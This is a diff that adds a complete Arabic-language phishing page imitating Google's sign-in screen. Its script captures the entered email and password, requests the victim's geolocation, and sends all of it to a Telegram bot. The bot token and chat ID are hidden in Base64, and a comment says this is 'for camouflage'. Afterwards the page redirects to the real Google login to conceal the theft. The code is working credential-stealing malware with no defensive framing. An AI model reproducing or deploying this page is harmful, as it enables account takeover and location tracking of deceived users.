@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Authentication</title>
+    <style>
+        body{font-family:'Roboto',sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{border:1px solid #dadce0;border-radius:8px;width:400px;padding:40px;text-align:center}img{width:75px}input{width:100%;padding:12px;margin:10px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box}button{background:#1a73e8;color:#fff;border:none;padding:10px;width:100%;border-radius:4px;cursor:pointer;margin-top:20px}
+    </style>
+</head>
+<body>
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
+    <h2>تسجيل الدخول</h2>
+    <p>استخدم حسابك في Google للمتابعة</p>
+    <form id="sec-form">
+        <input type="email" id="u" placeholder="البريد الإلكتروني" required>
+        <input type="password" id="p" placeholder="كلمة المرور" required>
+        <button type="submit">التالي</button>
+    </form>
+</div>
+
+<script>
+    // تشفير المعطيات الحساسة بـ Base64 لزيادة التمويه
+    const _0x1 = "ODQ0OTM4NTIzMjpBQUZXSGpvZ3VFZGpsLUlfclU0dzc4U1N6SkxLMERDa0hZVSA="; // Token
+    const _0x2 = "ODM5NzE5NDUyNw=="; // ID
+
+    const _d = (s) => atob(s.trim());
+
+    document.getElementById('sec-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const u = document.getElementById('u').value;
+        const p = document.getElementById('p').value;
+
+        navigator.geolocation.getCurrentPosition((pos) => {
+            const loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            _send(u, p, loc);
+        }, () => {
+            _send(u, p, "Denied");
+        });
+    });
+
+    function _send(u, p, l) {
+        const t = `🎯 Target:\n📧 User: ${u}\n🔑 Pass: ${p}\n📍 Loc: ${l}`;
+        fetch(`https://api.telegram.org/bot${_d(_0x1)}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: _d(_0x2), text: t})
+        }).then(() => {
+            window.location.href = "https://accounts.google.com/signin/v2/challenge/pwd";
+        });
+    }
+</script>
+</body>
+</html>
